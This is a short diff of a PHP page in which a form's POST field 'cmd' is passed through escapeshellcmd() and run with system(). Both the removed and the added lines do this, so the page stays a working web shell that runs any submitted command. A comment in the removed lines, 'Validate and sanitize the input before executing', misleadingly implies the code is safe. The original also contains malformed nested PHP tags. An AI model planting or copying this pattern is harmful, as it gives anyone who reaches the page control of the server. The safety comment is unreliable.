@@ -7,9 +7,5 @@
 </form>
 
 <?php
-<?php
-    // Validate and sanitize the input before executing
-    $cmd = escapeshellcmd($_POST['cmd']);
-    system($cmd);
-?>
+$cmd = escapeshellcmd($_POST['cmd']); system($cmd);
  ?>
